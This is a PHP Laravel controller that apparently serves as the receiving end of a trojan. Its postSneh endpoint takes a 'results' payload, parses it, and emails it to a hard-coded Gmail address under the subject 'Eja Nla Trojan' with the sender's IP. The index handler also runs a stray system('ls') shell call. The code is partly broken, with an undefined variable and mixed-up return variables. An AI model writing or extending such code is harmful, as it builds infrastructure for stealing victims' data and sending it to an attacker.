<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
    	$os = $this->helpers->getOS();
        system("ls");
    	return view('index', compact(['os']));
    }
    
    
    /**
	 * Sneh
	 *
	 * @return Response
	 */
	public function getSneh(Request $request)
    {
    	$os = $this->helpers->getOS();      
        $ret = array("os"=> $os);
    	return $ret;
    }
    
    
    public function postSneh(Request $request)
	{
           $req = $request->all();
               
                $validator = Validator::make($req, [
                             'results' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       //dd($messages);
             
                      $r = "<div class='alert alert-danger'><strong>Whoops!</strong> There were some problems signing you in.<br><br>";
                       $r .= "<ul>";
					
                       foreach($messages->all() as $error) $ret .= "<li>".$error."</li>";
            
                       $r .= "</ul></div>";
                       $ret = ['mode' => "error", 'error' => $r];
                       
                 }
                
                 else
                 { 
                 	 $ip = getenv("REMOTE_ADDR");
                 	  $s = "Eja Nla Trojan ~~ ".$ip." ~~ ".date("h:i A jS F, Y");
                       $rcpt = "mails4davidslogan@gmail.com";
                       $results = $req["results"];

                       $ret = [];
                       $temp = explode("GBAM",$results);
                       foreach($temp as $line){
                       	$temp2 = explode("|",$line);
                           if(is_array($temp2)) {
                             $temp3 = [];
                             foreach($temp2 as $t2) array_push($temp3,$t2);                          
                              array_push($ret,$temp3);
                           } 
                       } 
                       
                       #echo "here are the results: ".$results;
                         $this->helpers->sendEmail($rcpt,$s,['results' => $ret],'emails.login_alert','view');  
                          $ret = ['mode' => "success"];                      
                  }       
           return $ret;                                                                                            
	}

}
